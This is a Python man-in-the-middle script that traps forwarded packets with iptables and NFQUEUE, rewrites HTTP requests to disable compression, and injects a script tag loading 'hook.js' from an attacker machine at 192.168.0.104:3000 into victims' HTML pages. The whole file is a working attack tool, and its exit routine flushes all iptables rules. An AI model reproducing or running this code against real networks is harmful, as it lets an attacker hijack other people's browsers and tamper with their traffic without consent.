#!/usr/bin/env python3

import re
import subprocess
import netfilterqueue
import scapy.all as scapy
from colorama import Fore, Back, Style

port = 10000


def check_root_or_not():
    try:
        scapy.srp(scapy.Ether(), verbose=False, timeout=0.5)
    except PermissionError:
        print("\n[-] Kindly re-run with root privileges.\n")
        exit(0)


def __set_load(packet, load):
    packet[scapy.Raw].load = load.encode()

    # This is to delete 'chksum' (verification code) and 'len' (length) in 'TCP' and 'IP' layers.
    # Upon deletion scapy recalculates and fills those fields back again :)

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def __fix_content_length(packet_load, num_characters_added):
    # original_string = re.findall(r"(Content-Length:\s\d*", packet_load)[0]
    # # print("original_string = " + original_string)
    #
    # original_numeric_part = re.findall(r"\d+", original_string)[0]
    # # print("original_numeric_part = " + original_numeric_part)

    # The '?:' tells regex to use that data to locate, but not store/return it ;D
    original_numeric_part = re.findall(r"(?:Content-Length:\s)(\d*)", packet_load)[0]

    modified_numeric_part = int(original_numeric_part) + int(num_characters_added)
    # print("modified_numeric_part = " + str(modified_numeric_part))

    modified_packet_load = str(packet_load).replace(original_numeric_part, str(modified_numeric_part))
    return modified_packet_load


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # This creates a scapy_packet with same data/payload as that of our original queue packet! :D

    if scapy_packet.haslayer(scapy.Raw):

        try:
            load = scapy_packet[scapy.Raw].load.decode()

            injection_code = "<script src=\"http://192.168.0.104:3000/hook.js\"></script>"

            sport = scapy_packet[scapy.TCP].sport
            dport = scapy_packet[scapy.TCP].dport

            # Here we use '[scapy.TCP].dport' and '[scapy.TCP].sport' instead of 'haslayer(http.HTTPRequest)'
            # and 'haslayer(http.HTTPResponse)' respectively,
            # because we want ALL data sent through HTTP and not just REQUEST and RESPONSES ;)
            # Note - Port '80' is assigned by default to 'http' :)

            # If destination port is '80' then it means packet is being sent through 'http'

            if dport == port:

                # print("\n[*] Original HTTP Request :-\n")
                # print(scapy_packet.show())

                if "Accept-Encoding" or "HTTP/1.1" in load:
                    # encoding = re.findall(r"Accept-Encoding:.*?\n", load)[0]
                    # modified_load = load.replace(encoding, "")

                    # print("\n[*] Original HTTP Request load :-\n")
                    # print(load)

                    load = re.sub(r"Accept-Encoding:.*?\n", "", load)
                    load = load.replace("HTTP/1.1", "HTTP/1.0")

                    print("\n[*] Modified HTTP Request load :-\n")
                    print(load)

            # If source port is '80' then it means packet is coming from 'http'
            elif sport == port:

                # print("\n[*] Original HTTP Response :-\n")
                # print(scapy_packet.show())

                if "text/html" in load:
                    if "Content-Length:" in load:
                        load = __fix_content_length(load, int(len(injection_code)))
                        print(Fore.CYAN + Back.RED + "[-] Modified Content-Length load = "
                              + Style.RESET_ALL + str(load))

                if "</body>" in load:

                    load = str(scapy_packet[scapy.Raw].load).replace("</body>", injection_code + "</body>")

                    print(Fore.RED + Back.WHITE + Style.NORMAL + "\n[*] Modified HTTP Response load :-\n"
                          + Style.RESET_ALL)

                    print(str(load))

            if load != scapy_packet[scapy.Raw].load:
                scapy_packet = __set_load(scapy_packet, load)
                packet.set_payload(bytes(scapy_packet))

        except UnicodeDecodeError:
            pass

    packet.accept()  # Forwards the packet to the router/target :)
    # packet.drop()  # Doesn't forward the packet to the router/target


check_root_or_not()

subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
# Creates a queue of all packets being forwarded, and traps them in the queue.
# --queue-num specifies the queue number we want.

# subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
# subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
# This is used to trap packets sent as OUTPUT by our own computer.
# And also The INPUT packets that are received by our computer too, since spoofing works both ways :)
# To test the working of our spoof_dns locally first :)

queue = netfilterqueue.NetfilterQueue()  # Created an instance of NetfilterQueue() to hold a netFilter queue.

queue.bind(0, process_packet)  # Callback function refers each packet in the queue to the specified function :)
# This binds our object 'queue' to the queue with num. '0' created above using iptables through subprocess

try:
    print("\n[+] Starting intercept.py...\n")
    queue.run()  # This activates the queue; runs it! :D
except KeyboardInterrupt:
    print("\n\n[-] KeyboardInterrupt detected. \n[*] Restoring IP tables back to Normal...")
    subprocess.call("iptables --flush", shell=True)  # restores iptables back to normal :)
    pass
